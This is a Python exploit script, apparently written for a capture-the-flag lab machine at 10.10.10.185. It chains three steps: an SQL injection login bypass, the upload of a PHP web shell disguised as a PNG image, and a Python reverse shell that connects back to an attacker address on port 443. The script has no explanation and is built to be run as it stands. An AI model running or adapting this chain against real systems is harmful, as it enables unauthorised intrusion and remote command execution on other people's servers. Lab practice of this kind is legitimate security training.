import requests
from pwn import * 

def Shell():
	s = requests.Session()
	# Bypass authentication
	burp0_url = "http://10.10.10.185/login.php"
	burp0_cookies = {"PHPSESSID": "vnobthjl8lkq5uvs8l8jg0vv45"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://10.10.10.185/login.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.10.185", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"username": "admin' or 1=1-- -", "password": "admin' or 1=1-- -"}
	p1 = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, allow_redirects=True)

	# File upload
	burp1_url = "http://10.10.10.185:80/upload.php"
	burp1_cookies = {"PHPSESSID": "vnobthjl8lkq5uvs8l8jg0vv45"}
	burp1_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=---------------------------203760479339321258641224528438", "Origin": "http://10.10.10.185", "Connection": "close", "Referer": "http://10.10.10.185/upload.php", "Upgrade-Insecure-Requests": "1"}
	burp1_data = "-----------------------------203760479339321258641224528438\r\nContent-Disposition: form-data; name=\"image\"; filename=\"shell.php.png\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n<?php system($_REQUEST[cmd]); ?>\n\r\n-----------------------------203760479339321258641224528438\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Image\r\n-----------------------------203760479339321258641224528438--\r\n"
	p2 = s.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp1_data)
	print(p2.text)

	# Rev shell
	payload = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.26\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'"
	rev_url = f"http://10.10.10.185/images/uploads/shell.php.png?cmd={payload}"
	p3 = s.post(url=rev_url, headers=burp1_headers, cookies=burp1_cookies)

if __name__ == '__main__':
	Shell()

